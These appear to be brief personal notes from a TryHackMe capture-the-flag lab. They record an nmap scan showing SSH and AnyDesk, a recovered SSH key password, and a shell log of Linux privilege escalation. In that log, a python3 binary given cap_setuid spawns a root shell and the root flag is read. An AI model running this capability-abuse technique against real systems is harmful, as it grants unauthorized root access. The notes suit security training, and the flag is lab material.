
10.10.46.86
10.10.159.237

22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)

7070/tcp open  ssl/realserver?
| ssl-cert: Subject: commonName=AnyDesk Client


ssh id_rsa
password: annie123

annie:x:1000:1000:Annie Dash,,,:/home/annie:/bin/bash


https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

annie@desktop:~$ setcap cap_setuid+ep ./python3
annie@desktop:~$ getcap -r / 2>/dev/null
/home/annie/python3 = cap_setuid+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
annie@desktop:~$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@desktop:~#

root@desktop:~# cat /root/root.txt
THM{0nly_th3m_5.5.2_D3sk}